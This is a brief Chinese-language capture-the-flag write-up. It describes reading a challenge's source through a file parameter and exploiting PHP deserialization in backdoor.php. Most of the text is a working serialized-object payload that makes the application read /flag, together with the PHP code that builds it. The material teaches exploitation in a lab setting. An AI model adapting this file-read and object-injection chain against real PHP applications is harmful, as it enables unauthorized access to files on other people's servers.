访问 /index.php?do=search&file=index.php 读取源码

发现backdoor.php 存在和反序列化漏洞

payload:
O:4:"User":6:{s:4:"user";N;s:9:"hechengyu";N;s:5:"trash";N;s:2:"db";N;s:6:"tbUser";N;s:6:"string";O:4:"User":6:{s:4:"user";N;s:9:"hechengyu";O:8:"DB_Mysql":8:{s:4:"host";N;s:8:"username";N;s:8:"password";N;s:8:"database";N;s:7:"charset";N;s:6:"linkId";N;s:7:"queryId";N;s:10:"configfile";s:5:"/flag";}s:5:"trash";N;s:2:"db";N;s:6:"tbUser";N;s:6:"string";N;}}

```php
<?php
class DB_Mysql
{
    public $host, $username, $password, $database, $charset;
    public $linkId, $queryId, $configfile;
}

class User
{
    public $user;
    public $hechengyu;
    public $trash;
    public $db;
    public $tbUser;
    public $string;
}

$a = new User();
$b = new DB_Mysql();
$c = new User();

$b->configfile = "/flag";
$c->hechengyu = $b;
$a->string = $c;

echo serialize($a);

```
